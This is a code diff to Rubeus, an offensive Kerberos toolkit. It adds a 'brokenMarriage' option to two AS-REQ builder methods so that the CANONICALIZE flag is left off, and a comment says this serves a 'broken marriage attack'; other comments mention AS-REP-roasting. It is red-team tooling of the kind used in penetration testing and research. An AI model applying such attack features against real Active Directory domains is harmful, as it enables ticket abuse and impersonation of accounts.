@@ -20,7 +20,7 @@ namespace Rubeus
     
     public class AS_REQ
     {
-        public static AS_REQ NewASReq(string userName, string domain, Interop.KERB_ETYPE etype, bool opsec = false, string service = null, string principalType = "principal")
+        public static AS_REQ NewASReq(string userName, string domain, Interop.KERB_ETYPE etype, bool opsec = false, string service = null, string principalType = "principal", bool brokenMarriage = false)
         {
             // build a new AS-REQ for the given userName, domain, and etype, but no PA-ENC-TIMESTAMP
             //  used for AS-REP-roasting
@@ -70,7 +70,10 @@ namespace Rubeus
                 List<HostAddress> addresses = new List<HostAddress>();
                 addresses.Add(new HostAddress(hostName));
                 req.req_body.addresses = addresses;
-                req.req_body.kdcOptions = req.req_body.kdcOptions | Interop.KdcOptions.CANONICALIZE;
+                if (!brokenMarriage)
+                {
+                    req.req_body.kdcOptions = req.req_body.kdcOptions | Interop.KdcOptions.CANONICALIZE;
+                }
                 req.req_body.etypes.Add(Interop.KERB_ETYPE.aes256_cts_hmac_sha1);
                 req.req_body.etypes.Add(Interop.KERB_ETYPE.aes128_cts_hmac_sha1);
                 req.req_body.etypes.Add(Interop.KERB_ETYPE.rc4_hmac);
@@ -88,7 +91,7 @@ namespace Rubeus
             return req;
         }
 
-        public static AS_REQ NewASReq(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, bool opsec = false, bool changepw = false, bool pac = true, string service = null, Interop.KERB_ETYPE suppEtype = Interop.KERB_ETYPE.rc4_hmac, string principalType = "principal")
+        public static AS_REQ NewASReq(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, bool opsec = false, bool changepw = false, bool pac = true, string service = null, Interop.KERB_ETYPE suppEtype = Interop.KERB_ETYPE.rc4_hmac, string principalType = "principal", bool brokenMarriage = false)
         {
             // build a new AS-REQ for the given userName, domain, and etype, w/ PA-ENC-TIMESTAMP
             //  used for "legit" AS-REQs w/ pre-auth
@@ -143,7 +146,11 @@ namespace Rubeus
                 List<HostAddress> addresses = new List<HostAddress>();
                 addresses.Add(new HostAddress(hostName));
                 req.req_body.addresses = addresses;
-                req.req_body.kdcOptions = req.req_body.kdcOptions | Interop.KdcOptions.CANONICALIZE;
+                if (!brokenMarriage)
+                {
+                    // When performing a broken marriage attack we don't want to canonicalize the ticket
+                    req.req_body.kdcOptions = req.req_body.kdcOptions | Interop.KdcOptions.CANONICALIZE;
+                }
                 req.req_body.etypes.Add(Interop.KERB_ETYPE.aes256_cts_hmac_sha1);
                 req.req_body.etypes.Add(Interop.KERB_ETYPE.aes128_cts_hmac_sha1);
                 req.req_body.etypes.Add(Interop.KERB_ETYPE.rc4_hmac);
